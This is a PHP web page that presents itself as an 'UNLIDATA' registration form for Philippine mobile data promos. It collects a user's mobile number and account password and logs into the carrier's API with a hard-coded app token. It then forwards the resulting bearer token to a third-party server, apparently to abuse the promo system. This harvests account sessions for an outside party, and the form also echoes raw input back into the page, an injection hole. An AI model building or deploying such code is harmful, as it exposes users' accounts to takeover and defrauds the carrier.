<?php

ini_set('display_errors', 0);

error_reporting(E_ERROR | E_WARNING | E_PARSE);



?>

<!DOCTYPE html>
<html>
  <head>
	<title>UNLIDATA REGISTRATION</title>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js" type="text/javascript"></script>

	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">

	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap-theme.min.css">

	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jquery.bootstrapvalidator/0.5.0/css/bootstrapValidator.min.css">

	<meta name="viewport" content="width=device-width,initial-scale=1">

	<link rel="icon" type="image/png" href="https://play-lh.googleusercontent.com/3x9p2u-MtRKDvLD1Q5eZ4JOgo-N-lP4ueTGNopBWZItgbZltuqpyJPL1qiWbrd177g">
<style>
.titlez
{
text-align: center;
font-family:courier;
font-size: 40px;
font-style: bold;
whitespace: nowrap;
display: inline-block;
overflow-x: auto;

}
</style>
  </head>
  <body style="margin: 10px;">
	<p class="titlez">UNLIDATA REGISTRATION</p>
	<form class="well form-horizontal" action="" method="post" id="unlidataform">

<div class="form-group">

<label class="col-md-4 control-label">Mobile Number</label>

<div class="col-md-4 inputGroupContainer">

<div class="input-group">

<span class="input-group-addon">

<i class="glyphicon glyphicon-earphone"></i>

</span>

<input name="number" placeholder="09123456789" class="form-control" type="text" value="<?php echo $_POST['number']; ?>" onkeyup='this.value=this.value.replace(/[^\d]/,"")' maxlength="11">

</div>

</div>

</div>

<div class="form-group">

<label class="col-md-4 control-label">GigaLife Password</label>

<div class="col-md-4 inputGroupContainer">

<div class="input-group">

<span class="input-group-addon">

<i class="glyphicon glyphicon-lock"></i>

</span>

<input name="password" placeholder="•••••••••" class="form-control" type="password" value="<?php echo $_POST['password']; ?>" required>

</div>

</div>

</div>

<div class="form-group">

<label class="col-md-4 control-label">GLA Key</label>

<div class="col-md-4 inputGroupContainer">

<div class="input-group">

<span class="input-group-addon">

<i class="glyphicon glyphicon-barcode"></i>

</span>

<input name="gla" placeholder="gla" class="form-control" type="text" value="<?php echo $_POST['gla']; ?>" required>

</div>

</div>

</div>

<div class="form-group">

<label class="col-md-4 control-label">Promo List</label>

<div class="col-md-4 selectContainer">

<div class="input-group">

<span class="input-group-addon">

<i class="glyphicon glyphicon-list"></i>

</span>

<select name="promo" class="form-control selectpicker">

<option value="" disabled selected>Select Promo</option>
				  <optgroup label="Smart/Rocket/TNT - UnliData Promo">
					<option value="1601061644">UnliData 99 (7 Days)</option>
					<option value="1601062079">UnliData 299 (30 Days)</option>
					<optgroup label="SmartBro - UnliData Promo">
					  <option value="1601457151">SmartBro UnliData 499 (30 Days)</option>
					  <option value="1601456308">SmartBro UnliData 599 (30 Days)</option>
					  <option value="1601456749">SmartBro UnliFam 999 (30 Days)</option>
					  <optgroup label="Magic Data">
						<option value="1600822470">Magic Data 99 2GB (No Expiry)</option>
						<option value="1600822011">Magic Data 199 6GB (No Expiry)</option>
						<option value="1600822929">Magic Data 399 24GB (No Expiry)</option>
						<optgroup label="Smart/Sun/TNT - All Data Promo">
						  <option value="1601107800">All Data 75 2GB (3 Days)</option>
						  <option value="1601107471">All Data 149 6GB (7 Days)</option>
						  <option value="1601107142">All Data 499 24GB (30 Days)</option>
						  <optgroup label="TNT Promo">
							<option value="1600768762">TNT ML10 1GB (3 Days)</option>
							<option value="1600792140">TNT ML50 (7 Days)</option>
							<option value="1600792578">TNT COD10 1GB (3 Days)</option>
							<option value="1600768975">TNT FB10 1GB (3 Days)</option>
							<option value="3761">TNT FB50 (7 Days)</option>
							<option value="1601477738">TNT Tiktok10 (3 Days)</option>
							<option value="1601478554">TNT Tiktok50 (3 Days)</option>
							<option value="1600794558">TNT WildRift10 (3 Days)</option>
							<option value="1600794345">TNT WildRift50 (7 Days)</option>
</select>

</div>

</div>

</div>

<div class="form-group">

<label class="col-md-4 control-label"></label>

<div class="col-md-4">

<button type="submit" class="btn btn-warning">Register <span class="glyphicon glyphicon-send"></span>

</button>

</div>

</div>

</fieldset>

<?php

if ($_POST["number"]) {

$number = $_POST["number"];

$gla = $_POST["gla"];

$number = ltrim($number, '0');

$password = $_POST["password"];

$url = "https://app1.smart.com.ph/api/v2/login";

$curl = curl_init($url);

curl_setopt($curl, CURLOPT_URL, $url);

curl_setopt($curl, CURLOPT_POST, true);

curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(

"Content-Type: application/json",

"gla: r0+W9Vv+Cg0fjdhr4pUDC9tbKyN2VbXfeI50mFzyQ6k=",

"X-Application-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJhcHBfaWQiOiJpb3MiLCJpYXQiOjE1OTg1ODY1MjYsIm5iZiI6MTU5ODU4NjUyNiwiZXhwIjoxOTEzOTQ2NTI2fQ.xVM2s_Owt4zNWLOlllhPXcRQ4b23x6KQpqs_2NGu9zPlQ9hjOsSS6pr9Qams7jfsyMPXtik2MFvv8V_nT8oG5Q",

"User-Agent: okhttp/5.0.0-alpha.2"

);

curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "{\"password\":\"$password\",\"number\":\"0$number\"}";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

$resp = curl_exec($curl);

$token = json_decode($resp);

$token = $token->token;

curl_close($curl);

$jsonresp = json_decode($resp);

$detail = $jsonresp->errors{0}->detail;

}

?>

<?php

if ($_POST["number"]) {

$number = $_POST["number"];

$gla = $_POST["gla"];

$promo = $_POST["promo"];

$number = ltrim($number, '0');

$url = "https://alias.nathcreqtives.com/smart/api.php";

$curl = curl_init($url);

curl_setopt($curl, CURLOPT_URL, $url);

curl_setopt($curl, CURLOPT_POST, true);

curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(

"Content-Type: application/json",

"Number: $number",

"gla: $gla",

"Authorization: Bearer $token",

"Promo: $promo",

"apikey: sixtyninepositionsabinya"

);

curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);

curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp = curl_exec($curl);

curl_close($curl);

$jsonresp = json_decode($resp);

$title = $jsonresp->title;

$msg = $jsonresp->message;

$details = $jsonresp->errors{0}->details;

$unlimsg = $jsonresp->message;

echo "<div class=\"form-group\"><label class=\"col-md-4 control-label\"></label><div class=\"col-md-4\">$title<br> $msg <br>$msg1</div></div>";

}

?>



</form>

<center>© Johnnyx</center>



</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>

<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-validator/0.4.5/js/bootstrapvalidator.min.js"></script>

<script>
$(document).ready(function() {
$("#unlidataform").bootstrapValidator({
feedbackIcons: {
valid: "glyphicon glyphicon-ok",
invalid: "glyphicon glyphicon-remove",
validating: "glyphicon glyphicon-refresh"
},
fields: {
number: {
validators: {
stringLength: {
min: 11
},
notEmpty: {
message: "Please enter your mobile number"
}
}
},
promo: {
validators: {
notEmpty: {
message: "Please select your promo"
}
}
}
}
}).on("success.form.bv", function(o) {
$("#success_message").slideDown({
opacity: "show"
}, "slow"), $("#unlidataform").data("bootstrapValidator").resetForm(), o.preventDefault();
o = $(o.target), o.data("bootstrapValidator");
$.post(o.attr("action"), o.serialize(), function(o) {
console.log(o)
}, "json")
})
});
</script>
</body>
</html>